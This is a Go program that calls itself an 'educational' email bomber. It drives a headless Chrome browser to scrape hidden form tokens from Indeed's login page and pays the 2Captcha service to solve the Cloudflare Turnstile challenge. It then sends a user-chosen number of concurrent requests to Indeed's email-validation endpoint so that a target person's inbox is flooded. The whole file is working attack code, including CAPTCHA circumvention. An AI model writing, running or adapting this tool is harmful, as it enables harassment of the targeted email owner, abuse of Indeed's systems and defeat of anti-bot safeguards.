package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/chromedp"
)

// --- User-Agent List ---
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
}

// --- Structs ---
type IndeedTokens struct {
	SurfTok       string
	FormTk        string
	CaptchaToken  string
}

// --- 2Captcha Solver ---
func solveTurnstile(apiKey, siteKey, pageURL string) (string, error) {
	log.Println("[2Captcha] Requesting Turnstile token...")
	client := &http.Client{Timeout: 60 * time.Second}
	data := url.Values{"key": {apiKey}, "method": {"turnstile"}, "sitekey": {siteKey}, "pageurl": {pageURL}, "json": {"1"}}
	resp, err := client.PostForm("https://2captcha.com/in.php", data)
	if err != nil { return "", err }
	defer resp.Body.Close()
	var result map[string]interface{}
	body, _ := io.ReadAll(resp.Body)
	if err := json.Unmarshal(body, &result); err != nil { return "", err }
	if status, ok := result["status"].(float64); !ok || status != 1 { return "", fmt.Errorf("2captcha service error: %v", result["request"]) }
	captchaID := result["request"].(string)
	log.Printf("[2Captcha] Successfully got CAPTCHA ID: %s. Now polling for token...", captchaID)
	for i := 0; i < 24; i++ {
		time.Sleep(5 * time.Second)
		reqURL := fmt.Sprintf("https://2captcha.com/res.php?key=%s&action=get&id=%s&json=1", apiKey, captchaID)
		res, err := client.Get(reqURL)
		if err != nil { continue }
		defer res.Body.Close()
		var poll map[string]interface{}
		body, _ := io.ReadAll(res.Body)
		if err := json.Unmarshal(body, &poll); err != nil { return "", err }
		if status, ok := poll["status"].(float64); ok && status == 1 {
			token := poll["request"].(string)
			log.Println("[2Captcha] Successfully got CAPTCHA token.")
			return token, nil
		}
	}
	return "", fmt.Errorf("captcha not solved in time")
}

// --- Chromedp Setup Phase ---
func performIndeedSetupWithChromedp(captchaAPIKey string) (*IndeedTokens, error) {
	log.Println("[Chromedp] Starting browser to gather tokens...")

	// --- MODIFIED SECTION: Added optimization flags for server environments ---
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true), // Ensure it runs in headless mode
		chromedp.Flag("disable-gpu", true), // Disable GPU acceleration
		chromedp.Flag("no-sandbox", true), // Required for running as root in many container environments
		chromedp.Flag("disable-dev-shm-usage", true), // Overcome limited resource problems
	)
	allocatorCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()

	// Create a new chromedp context from the allocator
	ctx, cancel := chromedp.NewContext(allocatorCtx, chromedp.WithLogf(log.Printf))
	defer cancel()
	
	// MODIFIED: Increased timeout to 3 minutes (180 seconds)
	ctx, cancel = context.WithTimeout(ctx, 180*time.Second) 
	defer cancel()
	// -------------------------------------------------------------------------

	var surftok, formtk, sitekey string
	loginURL := "https://secure.indeed.com/account/login"

	err := chromedp.Run(ctx,
		chromedp.Navigate(loginURL),
		chromedp.WaitVisible(`body`),
		chromedp.Value(`input[name="surftok"]`, &surftok, chromedp.ByQuery),
		chromedp.Value(`input[name="form_tk"]`, &formtk, chromedp.ByQuery),
		chromedp.AttributeValue(`.cf-turnstile`, "data-sitekey", &sitekey, nil, chromedp.ByQuery),
	)

	if err != nil { return nil, fmt.Errorf("failed to scrape initial tokens: %w", err) }
	if surftok == "" || formtk == "" || sitekey == "" {
		return nil, fmt.Errorf("one or more required tokens were not found on the page (surftok, form_tk, sitekey)")
	}
	log.Printf("[Chromedp] Scraped surftok, form_tk, and sitekey (%s).", sitekey)

	captchaToken, err := solveTurnstile(captchaAPIKey, sitekey, loginURL)
	if err != nil {
		return nil, fmt.Errorf("failed to solve turnstile captcha: %w", err)
	}

	tokens := &IndeedTokens{
		SurfTok:      surftok,
		FormTk:       formtk,
		CaptchaToken: captchaToken,
	}
	return tokens, nil
}


// --- Core Attack Function (using http.Client) ---
func runAttack(wg *sync.WaitGroup, client *http.Client, email string, tokens *IndeedTokens) {
	defer wg.Done()
	log.Println("[HTTP Attack] Sending request to Indeed...")
	payload := url.Values{"__email": {email}, "cf-turnstile-response": {tokens.CaptchaToken}, "surftok": {tokens.SurfTok}, "form_tk": {tokens.FormTk}, "co": {"SE"}, "hl": {"sv_SE"}}
	req, _ := http.NewRequest("POST", "https://secure.indeed.com/account/emailvalidation", strings.NewReader(payload.Encode()))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil { log.Printf("[FAILURE] Request failed: %v", err); return }
	defer resp.Body.Close()
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		log.Printf("[SUCCESS] Request sent successfully. Status: %d", resp.StatusCode)
	} else {
		log.Printf("[FAILURE] Request failed with status. Status: %d", resp.StatusCode)
	}
}


// --- Interactive Prompt ---
func promptForInput(reader *bufio.Reader, prompt string) string {
	fmt.Print(prompt)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

// --- Main Function ---
func main() {
	rand.Seed(time.Now().UnixNano())
	log.Println("--- Chromedp-Powered Bomber (Educational Version) ---")
	reader := bufio.NewReader(os.Stdin)
	targetEmail := promptForInput(reader, "Enter the target email address: ")
	if targetEmail == "" { log.Fatal("Error: Target email cannot be empty.") }
	captchaKey := promptForInput(reader, "Enter your 2captcha.com API key (required for Indeed): ")
	if captchaKey == "" { log.Fatal("Error: 2Captcha API key is required for this target.") }
	attacksStr := promptForInput(reader, "Enter the number of attacks: ")
	attacks, err := strconv.Atoi(attacksStr)
	if err != nil || attacks <= 0 { log.Fatal("Error: Invalid number of attacks.") }

	// --- Phase 1: Setup with Chromedp ---
	indeedTokens, err := performIndeedSetupWithChromedp(captchaKey)
	if err != nil {
		log.Fatalf("Critical error during setup phase: %v", err)
	}
	log.Println("--- Setup Phase Complete. All tokens acquired. ---")

	// --- Phase 2: Attack with http.Client ---
	log.Printf("Starting %d attacks...", attacks)
	var wg sync.WaitGroup
	jar, _ := cookiejar.New(nil)
	client := &http.Client{Jar: jar, Timeout: 30 * time.Second}
	for i := 0; i < attacks; i++ {
		wg.Add(1)
		go runAttack(&wg, client, targetEmail, indeedTokens)
		time.Sleep(100 * time.Millisecond)
	}
	wg.Wait()
	log.Println("--- Operation Finished ---")
}
